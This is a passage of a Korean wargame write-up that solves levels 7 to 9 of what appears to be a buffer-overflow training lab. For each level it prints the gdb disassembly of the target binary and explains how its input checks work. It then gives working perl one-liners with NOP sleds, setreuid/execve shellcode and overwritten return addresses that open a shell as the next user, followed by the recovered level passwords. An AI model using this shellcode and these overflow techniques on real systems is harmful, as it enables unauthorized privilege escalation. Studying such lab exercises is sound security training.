aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
$ whoami
lv7
$ id
uid=1007(lv7) gid=1006(lv6) groups=1006(lv6)
$ my-pass
do you know argv?
$ 
```
알아낸 lv7 비번 : do you know argv?

## lv 7
gdb로 lv8가 무슨 프로그램인지 확인해보자.
```
   0x08048500 <+0>:	push   ebp
   0x08048501 <+1>:	mov    ebp,esp
   0x08048503 <+3>:	sub    esp,0x2c
   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x2
   0x0804850a <+10>:	je     0x8048523 <main+35>
   0x0804850c <+12>:	push   0x8048690
   0x08048511 <+17>:	call   0x8048410 <printf@plt>
   0x08048516 <+22>:	add    esp,0x4
   0x08048519 <+25>:	push   0x0
   0x0804851b <+27>:	call   0x8048420 <exit@plt>
   0x08048520 <+32>:	add    esp,0x4
   0x08048523 <+35>:	nop
   0x08048524 <+36>:	mov    DWORD PTR [ebp-0x2c],0x0
   0x0804852b <+43>:	nop
   0x0804852c <+44>:	lea    esi,[esi+eiz*1+0x0]
   0x08048530 <+48>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x08048533 <+51>:	lea    edx,[eax*4+0x0]
   0x0804853a <+58>:	mov    eax,ds:0x80497cc
   0x0804853f <+63>:	cmp    DWORD PTR [eax+edx*1],0x0
   0x08048543 <+67>:	jne    0x8048547 <main+71>
   0x08048545 <+69>:	jmp    0x8048587 <main+135>
   0x08048547 <+71>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804854a <+74>:	lea    edx,[eax*4+0x0]
   0x08048551 <+81>:	mov    eax,ds:0x80497cc
   0x08048556 <+86>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048559 <+89>:	push   edx
   0x0804855a <+90>:	call   0x80483f0 <strlen@plt>
   0x0804855f <+95>:	add    esp,0x4
   0x08048562 <+98>:	mov    eax,eax
   0x08048564 <+100>:	push   eax
   0x08048565 <+101>:	push   0x0
   0x08048567 <+103>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804856a <+106>:	lea    edx,[eax*4+0x0]
   0x08048571 <+113>:	mov    eax,ds:0x80497cc
   0x08048576 <+118>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048579 <+121>:	push   edx
   0x0804857a <+122>:	call   0x8048430 <memset@plt>
   0x0804857f <+127>:	add    esp,0xc
   0x08048582 <+130>:	inc    DWORD PTR [ebp-0x2c]
   0x08048585 <+133>:	jmp    0x8048530 <main+48>
   0x08048587 <+135>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858a <+138>:	add    eax,0x4
   0x0804858d <+141>:	mov    edx,DWORD PTR [eax]
   0x0804858f <+143>:	add    edx,0x2f
   0x08048592 <+146>:	cmp    BYTE PTR [edx],0xff
   0x08048595 <+149>:	je     0x80485b0 <main+176>
   0x08048597 <+151>:	push   0x80486a3
   0x0804859c <+156>:	call   0x8048410 <printf@plt>
   0x080485a1 <+161>:	add    esp,0x4
   0x080485a4 <+164>:	push   0x0
   0x080485a6 <+166>:	call   0x8048420 <exit@plt>
   0x080485ab <+171>:	add    esp,0x4
   0x080485ae <+174>:	mov    esi,esi
   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485b3 <+179>:	add    eax,0x4
   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
   0x080485b8 <+184>:	push   edx
   0x080485b9 <+185>:	call   0x80483f0 <strlen@plt>
   0x080485be <+190>:	add    esp,0x4
   0x080485c1 <+193>:	mov    eax,eax
   0x080485c3 <+195>:	cmp    eax,0x30
   0x080485c6 <+198>:	jbe    0x80485e0 <main+224>
   0x080485c8 <+200>:	push   0x80486c0
   0x080485cd <+205>:	call   0x8048410 <printf@plt>
   0x080485d2 <+210>:	add    esp,0x4
   0x080485d5 <+213>:	push   0x0
   0x080485d7 <+215>:	call   0x8048420 <exit@plt>
   0x080485dc <+220>:	add    esp,0x4
   0x080485df <+223>:	nop
   0x080485e0 <+224>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485e3 <+227>:	add    eax,0x4
   0x080485e6 <+230>:	mov    edx,DWORD PTR [eax]
   0x080485e8 <+232>:	push   edx
   0x080485e9 <+233>:	lea    eax,[ebp-0x28]
   0x080485ec <+236>:	push   eax
   0x080485ed <+237>:	call   0x8048440 <strcpy@plt>
   0x080485f2 <+242>:	add    esp,0x8
   0x080485f5 <+245>:	lea    eax,[ebp-0x28]
   0x080485f8 <+248>:	push   eax
   0x080485f9 <+249>:	push   0x80486d7
   0x080485fe <+254>:	call   0x8048410 <printf@plt>
   0x08048603 <+259>:	add    esp,0x8
   0x08048606 <+262>:	push   0x28
   0x08048608 <+264>:	push   0x0
   0x0804860a <+266>:	lea    eax,[ebp-0x28]
   0x0804860d <+269>:	push   eax
   0x0804860e <+270>:	call   0x8048430 <memset@plt>
   0x08048613 <+275>:	add    esp,0xc
   0x08048616 <+278>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048619 <+281>:	add    eax,0x4
   0x0804861c <+284>:	mov    edx,DWORD PTR [eax]
   0x0804861e <+286>:	push   edx
   0x0804861f <+287>:	call   0x80483f0 <strlen@plt>
   0x08048624 <+292>:	add    esp,0x4
   0x08048627 <+295>:	mov    eax,eax
   0x08048629 <+297>:	push   eax
   0x0804862a <+298>:	push   0x0
   0x0804862c <+300>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804862f <+303>:	add    eax,0x4
   0x08048632 <+306>:	mov    edx,DWORD PTR [eax]
   0x08048634 <+308>:	push   edx
   0x08048635 <+309>:	call   0x8048430 <memset@plt>
   0x0804863a <+314>:	add    esp,0xc
   0x0804863d <+317>:	leave  
   0x0804863e <+318>:	ret 
 ```
argc가 2개로 제한되어있으므로 파일명을 포함하여 인자는 1개를 초과할 수 없다.

또한 버퍼를 지우는 것은 물론 함수 인자부분부터 환경변수까지 모두 0으로 초기화 시킨다.

해결책으로 lv6을 해결할때 이용한 심볼릭 링크를 이용하면 된다.  
즉, 실행프로그램 이름에 적당한 개수의 nop와 쉘코드를 넣고   
ret부분에 들어갈 주소를 argv[0]을 가리키는 주소로 바꿔주면 해결된다.

```
lv7@ubuntu:~$ ./`perl -e 'print "\x90"x100, "\x66\xb8\xf0\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'` `perl -e 'print "a"x44, "\xcc\xd2\xff\xff"'`
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
$ whoami
lv8
$ id
uid=1008(lv8) gid=1007(lv7) groups=1007(lv7)
```
알아낸 lv8 비번 : bothering argc

## lv 8
gdb로 lv9가 무슨 프로그램인지 확인해보자.
```
   0x08048430 <+0>:	push   ebp
   0x08048431 <+1>:	mov    ebp,esp
   0x08048433 <+3>:	sub    esp,0x28
   0x08048436 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804843a <+10>:	jg     0x8048453 <main+35>
   0x0804843c <+12>:	push   0x8048520
   0x08048441 <+17>:	call   0x8048350 <printf@plt>
   0x08048446 <+22>:	add    esp,0x4
   0x08048449 <+25>:	push   0x0
   0x0804844b <+27>:	call   0x8048360 <exit@plt>
   0x08048450 <+32>:	add    esp,0x4
   0x08048453 <+35>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048456 <+38>:	add    eax,0x4
   0x08048459 <+41>:	mov    edx,DWORD PTR [eax]
   0x0804845b <+43>:	add    edx,0x2f
   0x0804845e <+46>:	cmp    BYTE PTR [edx],0xff
   0x08048461 <+49>:	je     0x8048480 <main+80>
   0x08048463 <+51>:	push   0x804852c
   0x08048468 <+56>:	call   0x8048350 <printf@plt>
   0x0804846d <+61>:	add    esp,0x4
   0x08048470 <+64>:	push   0x0
   0x08048472 <+66>:	call   0x8048360 <exit@plt>
   0x08048477 <+71>:	add    esp,0x4
   0x0804847a <+74>:	lea    esi,[esi+0x0]
   0x08048480 <+80>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048483 <+83>:	add    eax,0x4
   0x08048486 <+86>:	mov    edx,DWORD PTR [eax]
   0x08048488 <+88>:	add    edx,0x2e
   0x0804848b <+91>:	cmp    BYTE PTR [edx],0xff
   0x0804848e <+94>:	jne    0x80484a7 <main+119>
   0x08048490 <+96>:	push   0x8048549
   0x08048495 <+101>:	call   0x8048350 <printf@plt>
   0x0804849a <+106>:	add    esp,0x4
   0x0804849d <+109>:	push   0x0
   0x0804849f <+111>:	call   0x8048360 <exit@plt>
   0x080484a4 <+116>:	add    esp,0x4
   0x080484a7 <+119>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484aa <+122>:	add    eax,0x4
   0x080484ad <+125>:	mov    edx,DWORD PTR [eax]
   0x080484af <+127>:	push   edx
   0x080484b0 <+128>:	lea    eax,[ebp-0x28]
   0x080484b3 <+131>:	push   eax
   0x080484b4 <+132>:	call   0x8048370 <strcpy@plt>
   0x080484b9 <+137>:	add    esp,0x8
   0x080484bc <+140>:	lea    eax,[ebp-0x28]
   0x080484bf <+143>:	push   eax
   0x080484c0 <+144>:	push   0x804855f
   0x080484c5 <+149>:	call   0x8048350 <printf@plt>
   0x080484ca <+154>:	add    esp,0x8
   0x080484cd <+157>:	leave  
   0x080484ce <+158>:	ret
```
이번 프로그램은 값을 초기화하는 부분이 전혀 없다.  
그리고 이번에 새롭게 추가된 조건은 입력된 값의 47번째가 \xff면 안된다는 점이다.

그러나 argc 제한이나 입력글자 수 제한 같은건 하나도 없다.   
단지 47번째에 \xff를 피해주면 되는것이므로 nop값을 100000개 정도 넣어주자.  
이렇게 해주면 \xff가 아닌 주소값들에도 nop이 들어차게 될 것이고 ret에 넣어줄 주소값에 \xff를 피할 수 있게된다.
```
./lv9 `perl -e 'print "a"x44, "\xff\xff\xfe\xff", "\x90"x100000,"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
```
```
$ whoami
lv9
$ my-pass
troll slayer
$ 
```
알아낸 lv9 비번 : troll slayer
## lv 9
## lv 10
## lv 11
